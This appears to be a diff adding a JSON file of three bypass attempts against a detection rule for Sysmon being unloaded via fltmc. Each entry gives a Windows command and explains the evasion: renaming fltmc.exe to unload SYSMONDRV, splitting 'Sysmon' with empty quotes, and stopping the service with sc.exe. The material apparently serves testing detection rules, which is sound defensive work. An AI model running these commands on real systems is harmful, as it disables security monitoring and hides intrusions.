@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\fltmc.exe C:\\Windows\\Temp\\not_fltmc.exe && C:\\Windows\\Temp\\not_fltmc.exe unload SYSMONDRV",
+    "explanation": "The rule relies on the 'selection_img' field which checks if the Image ends with '\\fltmc.exe' or has the OriginalFileName 'fltMC.exe'. By copying the binary to a new name, the Image path check is bypassed. If the EDR/SIEM does not reliably populate or check the OriginalFileName metadata for renamed binaries in real-time, the execution will not trigger the 'selection_img' condition."
+  },
+  {
+    "output": "fltmc.exe unload \"Sys\"\"mon\"",
+    "explanation": "The 'selection_cli' condition looks for the literal string 'sysmon' in the command line. Using PowerShell or CMD-specific escaping/quoting (like empty double quotes) can break simple string matching in some logging environments while still being parsed correctly by the fltmc utility."
+  },
+  {
+    "output": "sc.exe stop Sysmon",
+    "explanation": "The rule is hyper-focused on the 'fltmc.exe' utility. An attacker can achieve the same goal of disabling Sysmon by stopping the service directly via 'sc stop' or 'net stop', which bypasses this specific detection logic entirely."
+  }
+]
